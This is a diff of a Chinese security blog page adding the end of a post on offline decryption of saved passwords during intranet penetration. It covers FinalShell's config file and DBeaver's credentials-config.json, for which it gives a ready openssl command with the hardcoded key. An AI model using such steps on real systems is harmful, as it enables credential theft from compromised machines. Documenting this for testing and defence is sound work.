+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDjRf5AaEfwrzsJzazeoliatHHYZZDeN3R80rYySicRD8icS7bzCFF5R94w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDJ9bAoVhXpRvhEM3tgRcRUdUK6GFaib5tygN7FvPTNO3EqfHK8pAqPDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>用户登录时必须勾选记住密码，否则不会在xxx_connect_config.json文件中保存密码</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZD3KfUWDricEQ3QgCVHW3vGesk6uucPc0wf8zQAW6lU2zdo9kdgicZgYcw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>离线解密：别人已经写好了的java代码</p>
+<p>FinalShellDecodePass.java</p>
+<h2 id="DBeaver"><a href="#DBeaver" class="headerlink" title="DBeaver"></a>DBeaver</h2><p>dbeaver是免费和开源（GPL）为开发人员和数据库管理员通用数据库工具。易用性是该项目的主要目标，是经过精心设计和开发的数据库管理工具。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZD2zsVdP3cjaFa9N4mb2BsvspZ2mM2icSyliau22Yf4Us32QQvpI7zdThQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>连接时勾选保存密码到本地</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDBvzbB7y7nZ06bnPZ3jwFdEuo3gw942K6NKqDG5DEwhI0cuHWN2rHQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>C:\Users\oneseven\AppData\Roaming\DBeaverData\workspace6\General.dbeaver\目录里.json文件中存放着数据库的连接信息和密码，credentials-config.json里是密码但做了加密</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDYicEYdgnZ03K9UPAHxc9ejuqcDHU9bF7icUQibZdqjeV7Njv30Sibq6aJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>离线解密：使用openssl解密，将credentials-config.json文件放入当前目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -d -K  babb4a9f774ab853c96c2d653dfe544a -iv 00000000000000000000000000000000 -in  credentials-config.json | dd bs=1 skip=16</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDjuicpnYseJXezSKHTEyWxOzMHk3G3ngtVmXpdqQJOmI8ic0VsygYzyDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对内网渗透中常见的软件密码离线解密进行了总结，由于环境、防护设备等因素实战中也会遇到各种各样的问题，因此将一些解密工作转移到本机进行，从而提高成功率，后续也会结合实战继续对利用方法进行完善补充。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>祝老板天天开心<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -604,20 +480,122 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Elasticsearch基础（一）
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2022/10/18/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99%E6%89%8B%E5%86%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">域渗透一条龙手册</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.</span> <span class="toc-text">内网软件密码离线解密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#360%E5%AE%89%E5%85%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">360安全浏览器离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firefox-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">Firefox 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.4.</span> <span class="toc-text">Chrome 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FileZilla-%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.5.</span> <span class="toc-text">FileZilla 客户端离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foxmail-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.6.</span> <span class="toc-text">Foxmail 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thunderbird-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.7.</span> <span class="toc-text">Thunderbird 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Navicat-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.8.</span> <span class="toc-text">Navicat 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql-%E7%A6%BB%E7%BA%BF%E6%9C%AC%E5%9C%B0%E8%A7%A3%E6%9E%90"><span class="toc-number">1.9.</span> <span class="toc-text">Mysql 离线本地解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PLSQL-Developer%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.10.</span> <span class="toc-text">PLSQL Developer离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xshell%E3%80%81Xftp%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.11.</span> <span class="toc-text">Xshell、Xftp离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SecureCRT-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.12.</span> <span class="toc-text">SecureCRT 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mobaxterm-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.13.</span> <span class="toc-text">Mobaxterm 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinSCP-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.14.</span> <span class="toc-text">WinSCP 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Royal-TS-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.15.</span> <span class="toc-text">Royal TS 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNC-Server-%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="toc-number">1.16.</span> <span class="toc-text">VNC Server 离线解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-RDP%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86%E8%A7%A3%E5%AF%86"><span class="toc-number">1.17.</span> <span class="toc-text">Windows RDP凭据管理解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FinalShell"><span class="toc-number">1.18.</span> <span class="toc-text">FinalShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DBeaver"><span class="toc-number">1.19.</span> <span class="toc-text">DBeaver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.20.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -641,8 +619,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
